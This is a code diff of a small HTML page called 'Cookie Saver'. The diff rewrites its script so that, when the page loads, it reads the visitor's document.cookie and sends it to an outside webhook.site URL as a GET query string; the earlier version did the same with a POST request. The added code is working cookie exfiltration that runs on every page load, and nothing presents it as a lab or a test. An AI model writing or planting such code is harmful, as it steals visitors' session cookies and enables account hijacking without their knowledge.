@@ -3,34 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Save Cookies</title>
+    <title>Send Cookies as Query</title>
     <script>
-        function sendCookiesToWebhook() {
+        // Function to send cookies as query string to the webhook
+        function sendCookiesAsQuery() {
             var cookies = document.cookie; // Get cookies
-            fetch('https://webhook.site/b528881d-aaf9-489e-b4d4-d12387cdc61e', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    cookies: cookies
+
+            // Prepare the query string
+            var queryString = new URLSearchParams();
+            queryString.append('cookies', cookies); // Add cookies to query string
+
+            // Send the query to the webhook URL
+            var url = 'https://webhook.site/b528881d-aaf9-489e-b4d4-d12387cdc61e?' + queryString.toString();
+
+            // Make the GET request
+            fetch(url, { method: 'GET' })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Success:', data);
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                console.log('Success:', data);
-            })
-            .catch((error) => {
-                console.error('Error:', error);
-            });
+                .catch((error) => {
+                    console.error('Error:', error);
+                });
         }
+
+        // Automatically send cookies as a query when the page loads
         window.onload = function() {
-            sendCookiesToWebhook();
+            sendCookiesAsQuery();
         };
     </script>
 </head>
 <body>
     <h1>Cookie Saver</h1>
-    <p>This page will send cookies to a webhook when loaded.</p>
+    <p>This page will automatically send cookies as a query to the webhook when loaded.</p>
 </body>
 </html>
